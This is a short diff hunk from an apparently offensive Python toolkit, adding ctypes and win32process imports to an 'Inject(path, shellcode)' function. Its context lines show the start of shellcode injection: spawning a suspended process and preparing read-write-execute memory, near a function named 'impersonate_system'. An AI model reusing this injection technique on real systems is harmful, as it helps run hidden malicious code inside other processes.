@@ -767,6 +767,15 @@ def impersonate_system():
             
 @requires_os('windows')
 def Inject(path, shellcode):
+    import ctypes, time
+    import ctypes.wintypes
+
+    from ctypes.wintypes import BOOL
+    from ctypes.wintypes import DWORD
+    from ctypes.wintypes import HANDLE
+    from ctypes.wintypes import LPVOID
+    from ctypes.wintypes import LPCVOID
+    import win32process
     # created suspended process
     info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
     page_rwx_value = 0x40
